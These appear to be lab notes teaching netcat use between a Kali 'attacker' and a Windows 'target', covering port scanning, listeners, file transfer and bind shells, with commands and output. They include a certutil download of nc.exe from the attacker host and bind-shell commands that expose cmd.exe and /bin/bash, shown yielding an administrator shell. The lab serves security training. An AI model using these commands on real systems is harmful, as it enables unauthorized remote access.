
# Netcat

`Netcat (Aka TCP/IP Swiss Army Knife)` is a network utility used to read and write data to network connections using TCP or UDP.

Its available for both *Nix and Windows OS, making it extremlly useful as you can use netcat from linux system towards windows system and vise versa

Netcat utilizes a client-server communication architecture with two models:

1. `Client Mode` - Netcat can be used in client mode to connect to any TCP/UDP port.

2. `Server Mode` - Netcat can also be used to listen for connections from client on a specific port.

Netcat can be used for

- Banner Grabbing
- Port Scanning
- Transfering Files
- Bind / Reverse shells

*********************************************************************************************************************************************

In this lab we have 
Attacker Machine  - Linux machine
Target Machine  - Windwos machine

# `PORT SCANNING`

# Lets coonect to target via netcat and check if port 80 is open,  we didnt observer anything, this is where flags are usefule

root@attackdefense:~# `nc 10.5.22.55 80`
^C
root@attackdefense:~# 

# Now lets add flag for `-n : No DNS resolution` and `-v Verbosity`, and we observe that its connected to target, previouosly we were not able to know what was happening

root@attackdefense:~# `nc -nv 10.5.22.55 80 `  
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.5.22.55:80.
^C
root@attackdefense:~# 

# Now lets check for ftp, we see it refused, so this how we can do `Port Scaning` using netcat

# Note this dosent confirms that particluar port is not open, there mighe be firewall sometiomes blocking you

root@attackdefense:~# `nc -nv 10.5.22.55 21`
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connection refused.
root@attackdefense:~# 

# Noe lets try connecting to a `UDP port` by using `-u flag`, lets say for `netbios`,`SNMP` and we see its connected

root@attackdefense:~# `nc -nvu 10.5.22.55 139`
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.5.22.55:139.

root@attackdefense:~# `nc -nvu 10.5.22.55 161`
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.5.22.55:161.

# `SETTING UP A LISTENER ON TCP/UDP PORT`

# In order to show this we need a client system and a server system, we have two machines linux and windows, now problem is windows dosent come pre-installed with netcat, so we need to make it available on it.

# Now we dont have internet access on this lab machine so cant download it, but our kali linux has the the netcat executable `nc.exe` in `/usr/share/windows-binaries`

root@attackdefense:~# `ls  /usr/share/windows-binaries`
enumplus     fport	  nbtenum    radmin.exe     whoami.exe
exe2bat.exe  klogger.exe  nc.exe     vncviewer.exe
fgdump	     mbenum	  plink.exe  wget.exe
root@attackdefense:~# 

# Now how do we transfer this to windows machine - So there are two ways we can do this
- We can setup a python webserver to host this executable and download in windows machine from browser or download it via command prompt

root@attackdefense:~# `cd /usr/share/windows-binaries`
root@attackdefense:/usr/share/windows-binaries# `python -m SimpleHTTPServer 80`
Serving HTTP on 0.0.0.0 port 80 ...

We can now got to our linux machine IP from windows and download this from browser or else we can also download it from command prompt using `certutil`

C:\Users\Administrator\Desktop> certutil -urlcache -f http://10.10.12.3/nc.exe nc.exe
**** Online ****
CertUtil: -URLCache command comepleted successfully.

# Now lets sutup listener on our kali machine on port 1234

root@attackdefense:/usr/share/windows-binaries# `cd ~/Desktop`
root@attackdefense:~/Desktop# `nc -nlvp 1234`
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234

# Now we can utilise netcat on windows to connect to our listener on kali machine   

C:\Users\Administrator\Desktop> nc.exe -nv 10.10.12.3 1234
<UNKNOWN> [10.10.12.3] 1234 <?> open

# We get connection on our linux listerner

root@attackdefense:~/`Desktop# nc -nlvp 1234`
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.5.22.55.
Ncat: Connection from 10.5.22.55:49404.

# Now we can utilise this in many ways for example sending message like HELLO from both machines

root@attackdefense:~/Desktop# nc -nlvp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.5.22.55.
Ncat: Connection from 10.5.22.55:49404.

hello! from linux
hellow from windows

C:\Users\Administrator\Desktop> nc.exe -nv 10.10.12.3 1234
<UNKNOWN> [10.10.12.3] 1234 <?> open

hell0 from linux!
hellow from Windows

# Similary we can setup listener on windows and connect from linux to it, We can similary listen and conect on a `UDP` port by mentioned `-u` flag `But in UDP connection you may or may not recieve messgae`

root@attackdefense:~/Desktop# `nc -nlvpu 1234`
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.5.22.55.
Ncat: Connection from 10.5.22.55:49404.

hello! from linux
hellow from windows

C:\Users\Administrator\Desktop> `nc.exe -nvu 10.10.12.3 1234`
<UNKNOWN> [10.10.12.3] 1234 <?> open

hell0 from linux!
hellow from Windows

# `Transferring Files using netcat`

# In order to transfer file from one system to another system usoing netcat wer need to have a listerner on system which will be recieving file `So the system to which we wan to transfer fille to, needs to have listner` and system which is sending will be connecting to that listerner

# lets create a file

root@attackdefense:~/Desktop# `echo "This is test data" > test.txt`
root@attackdefense:~/Desktop# `cat test.txt`
This is test data
root@attackdefense:~/Desktop# 

# Now lets listen on our windows machine, we will be using redirection symbol `>` so that whatever we recieve will be saved to a file`test.txt`

C:\Users\Administrator\Desktop> `nc.exe -nlvp 1234 > test.txt`
listening on [any] 1234 ....

# Now lets connect to windows machine and send file, in order to send file we use `<` symbol, and the file is sent and successfully recieved on woindows machine

root@attackdefense:~/Desktop# `nc -nv 10.5.19.93 1234 < test.txt`
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.5.19.93:1234.
Ncat: 18 bytes sent, 0 bytes received in 0.01 seconds.
root@attackdefense:~/Desktop# 


# `Bind Shell`

# In order to get Bind shell we will be listening with `-e` flag on the target system

C:\Users\Administrator\Desktop> `nc.exe -nlvp 1234 -e cmd.exe`
listening on [any] 1234 ....

# Now from the attacker system we will be connecting to listerner and we get the remote system command shell

root@attackdefense:~/Desktop# `nc -nv 10.5.29.220 1234`
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.5.29.220:1234.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>`whoami`
whoami
win-omcnbkr66mn\administrator

C:\Users\Administrator\Desktop>

# The same can be done from windows machine to linux target, however in that case argument for `-e` would be `/bin/bash`

root@attackdefense:~/Desktop# `nc -nlvp 1234 -e /bin/bash`

Note -  we can also use `-c` flag same as `-e`

root@attackdefense:~/Desktop# `nc -nlvp 1234 -c /bin/bash`

*********************************************************************************                                                                                    
┌──(kali㉿kali)-[~]
└─$ nc -help     
[v1.10-47]
connect to somewhere:   nc [-options] hostname port[s] [ports] ... 
listen for inbound:     nc -l -p port [-options] [hostname] [port]
options:
        -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
        -e filename             program to exec after connect [dangerous!!]
        -b                      allow broadcasts
        -g gateway              source-routing hop point[s], up to 8
        -G num                  source-routing pointer: 4, 8, 12, ...
        -h                      this cruft
        -i secs                 delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
        -l                      listen mode, for inbound connects
        -n                      numeric-only IP addresses, no DNS
        -o file                 hex dump of traffic
        -p port                 local port number
        -r                      randomize local and remote ports
        -q secs                 quit after EOF on stdin and delay of secs
        -s addr                 local source address
        -T tos                  set Type Of Service
        -t                      answer TELNET negotiation
        -u                      UDP mode
        -v                      verbose [use twice to be more verbose]
        -w secs                 timeout for connects and final net reads
        -C                      Send CRLF as line-ending
        -z                      zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
